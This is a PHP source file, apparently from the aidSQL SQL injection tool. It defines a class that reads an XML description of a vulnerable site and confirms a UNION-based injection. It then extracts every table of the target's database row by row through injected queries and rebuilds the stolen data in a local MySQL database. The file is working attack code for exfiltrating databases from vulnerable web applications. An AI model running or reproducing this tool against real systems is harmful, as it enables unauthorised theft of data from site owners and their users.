<?php

	namespace aidSQL\db {

		class MySQLDbBuilder {

			private	$_xmlFile		=	NULL;
			private	$_config			=	NULL;
			private	$_logger			=	NULL;
			private	$_httpAdapter	=	NULL;
			private	$_pLoader		=	NULL;

			public function __construct(Array $config,\aidSQL\http\adapter &$httpAdapter,\aidSQL\core\PluginLoader &$pLoader,\aidSQL\core\Logger &$log){

				$this->_config			=	$config;
				$this->_xmlFile		=	new \aidSQL\core\File($config["makedb"]);
				$this->setLog($log);
				$this->_httpAdapter	=	$httpAdapter;
				$this->_pLoader		=	$pLoader;
				
				$this->makeDb();
	
			}

			public function setLog(\aidSQL\core\Logger &$logger){

				$logger->setPrepend('['.__CLASS__.']');
				$this->_logger	=	$logger;

			}


			private function log($msg=NULL, $color="white", $level=0, $toFile=FALSE) {

				if (isset($this->_config["log-all"])) {
					$toFile = TRUE;
				}

				if (!is_null($this->_logger)) {

					$this->_logger->setPrepend('[' . __CLASS__ . ']');
					$this->_logger->log($msg, $color, $level, $toFile);
					return TRUE;

				}

				return FALSE;

			}

			public function setConfig(Array $config){
				$this->_config	=	$config;
			}

			private function parseXML(){

				$dom	=	new \DomDocument("1.0");
				$dom->load($this->_xmlFile->getFile());

				$host				=	$dom->getElementsByTagName("host")->item(0)->nodeValue;
				$link				=	$dom->getElementsByTagName("vulnlink")->item(0)->nodeValue;
				$domInjection	=	$dom->getElementsByTagName("injection")->item(0)->childNodes;
				$injection		=	array();

				foreach($domInjection as $inject){

					$nodeName		=	$inject->nodeName;
					$injectChilds	=	$inject->childNodes;

					foreach($injectChilds as $injectChild){

						if(sizeof($injectChild->childNodes)>0){
							$injection[$nodeName][$injectChild->nodeName]	=	$injectChild->nodeValue;
						}else{
							$injection[$nodeName]	=	$injectChild->nodeValue;
						}

					}

				}

				$url	=	new \aidSQL\core\Url($link);
				$url->addRequestVariable($injection["requestVariable"],$injection["requestValue"]);

				if(isset($injection["requestVariables"])){

					foreach($injection["requestVariables"] as $name=>$value){

						$url->addRequestVariable($name,$value);

					}

				}

				$this->_httpAdapter->setUrl($url);

				$schemasArray	=	array();
				$schemas			=	$dom->getElementsByTagName("schemas")->item(0)->childNodes;

				foreach($schemas as $schema){

					$schemaName	=	$schema->getAttribute("name");
					$schemasArray[$schemaName]	=	array();
					$tables							=	$schema->getElementsByTagName("table");

					foreach($tables as $table){

						$tableAttributes	=	array();
						$i						=	0;

						$tablesArray		=	array();

						while($table->attributes->item($i)){

							$name							=	$table->attributes->item($i)->name;
							$value						=	$table->attributes->item($i++)->value;

							$tableAttributes[$name]	=	$value;

						}

						$tableName	=	$tableAttributes["name"];
						unset($tableAttributes["name"]);

						$tablesArray["attributes"]	=	$tableAttributes;

						$columns			=	$table->childNodes;
						$columnsArray	=	array();

						foreach($columns as $column){

							$colName	=	$column->getAttribute("name");
							$columnsArray[$colName]	=	array();
							$colChilds	=	$column->childNodes;
							
							foreach($colChilds as $colChild){
								$columnsArray[$colName][$colChild->nodeName]	=	$colChild->nodeValue;
							}

							$tablesArray["columns"]	=	$columnsArray;

						}

						$schemasArray[$schemaName][$tableName]	=	$tablesArray;

					}

					

				}

				return $schemasArray;

			}

			public function makeDb(){
		
				if(!class_exists("MySQLi")){
					throw (new \Exception("Couldnt make MySQLDBAdapter instance, make sure you have the mysqli extension installed"));
				}

				$sqli		=	new \aidSQL\db\MySQLDbAdapter($this->_logger,$this->_config["dbhost"],"root",$this->_config["dbpass"]);

				if($this->_config["verbose"]){

					$sqli->setVerbose();

				}

				$schemas	=	$this->parseXml();
				$plugin	=	$this->_pLoader->getPluginInstance("sqli","mysql5",$this->_httpAdapter,$this->_logger);

				if(!$plugin->injectionUnionWithConcat()){
					throw (new \Exception("Could not make database, perhaps the sql injection vulnerability was solved?"));
				}

				$allPrefix	=	"aidSQL_";

				foreach($schemas as $schemaName=>$schemaTables){

					$schemaName			=	$schemaName;
					$localSchemaName	=	$allPrefix.$schemaName;

					$this->createDatabase($sqli,$localSchemaName);

					$sqli->select_db($localSchemaName);

					if(array_key_exists("interactive",$this->_config)){

						$tables				=	array_keys($schemaTables);
						$selectedIndexes	=	interactive($this->_logger,$tables);

						foreach($tables as $k=>$v){

							if(!in_array($k,$selectedIndexes)){
								unset($tables[$k]);
							}

						}

					}

					foreach($schemaTables as $schemaTableName=>$schemaTableValues){

						if(isset($selectedIndexes)){

							if(!in_array($schemaTableName,$tables)){
								$this->log("Omitting table $schemaTableName",0,"yellow");
								continue;
							}
	
						}

						$schemaTableName			=	$schemaTableName;
						$localSchemaTableName	=	$allPrefix.$schemaTableName;

						if($this->createTable($sqli,$localSchemaTableName,$schemaTableValues)!==TRUE){
							throw(new \Exception("Couldnt create table $localSchemaTableName ".$sqli->errno.':'.$sqli->error));
						}

						$attributes			=	$schemaTableValues["attributes"];
						$columns				=	array_keys($schemaTableValues["columns"]);
						$colInsert			=	$columns;
						
						foreach($columns as &$col){

							$col="COALESCE($col,0)";

						}

						$fieldSeparator	=	"0x5c2d2a2f";
						$select				=	implode(",$fieldSeparator,",$columns);
						$from					=	$schemaName.'.'.$schemaTableName;

						$count				=	$plugin->count($columns[0],$from);
						$count				=	$count[0];

						$this->log("FOUND $count registers in table $schemaTableName",0,"light_cyan");

						if($count==0){
							continue;
						}

						$parameters	=	$plugin->getInjectionParameters();

						for($i=0;$i<$count;$i++){

							$parameters["limit"]	=	array($i,1);

							$plugin->setInjectionParameters($parameters);

							$values				=	$plugin->unionQuery($select,$from,array(),array());
							$values				=	$values[0];
							$values				=	explode("\\-*/",$values);

							if(!$this->insertRegisters($sqli,$localSchemaTableName,$colInsert,$values)){
								throw(new \Exception("Couldnt insert registers on $localSchemaTableName table!".$sqli->errno.':'.$sqli->error));
							}

						}

						$parameters["limit"]	=	array();
						$plugin->setInjectionParameters($parameters);

					}

				}

			}

			public function createDatabase(\MySQLi &$sqli,$schemaName){

				$sql	=	"CREATE DATABASE IF NOT EXISTS $schemaName";
				return $sqli->query($sql);

			}

			public function createTable(\MySQLi &$sqli,$tableName,Array $tableColumns){

				$sql	=	NULL;
				$sql	=	"CREATE TABLE IF NOT EXISTS $tableName(";

				$columns	=	array();

				foreach($tableColumns["columns"] as $columnName=>$columnSpecs){

					$columns[]="$columnName ".$columnSpecs["type"];

				}

				//FIX
				foreach($columns as &$column){

					if(preg_match('/\([0-9]+/',$column)&&substr($column,-1)!=')'){
						$column.=')';
					}

				}

				$columns		=	implode(',',$columns);
				$sql			=	"CREATE TABLE IF NOT EXISTS $tableName(".$columns.")";
				$truncate	=	"TRUNCATE TABLE $tableName";
				
				return ($sqli->query($sql) && $sqli->query($truncate));

			}

			public function insertRegisters(\MySQLi &$sqli,$tableName,Array $columns,Array $registers){
			
				$sql		=	"INSERT INTO $tableName SET ";
				$result	=	@array_combine($columns,$registers);

				foreach($registers as &$reg){

					$reg	=	$sqli->real_escape_string($reg);

				}

				if(!$result){

					//FIX ME
					$registers	=	array_pad($registers,sizeof($columns),'-');
					$result		=	array_combine($columns,$registers);
					$this->log("WARNING! INSERTING PADDED VALUES, THIS DATA IS NOT ACCURATE!",1,"red");

				}

				foreach($result as $colName=>$colVal){
					$sql.="$colName='$colVal',";
				}

				$sql=substr($sql,0,-1);
				return $sqli->query($sql);

			}

		}

	}

?>
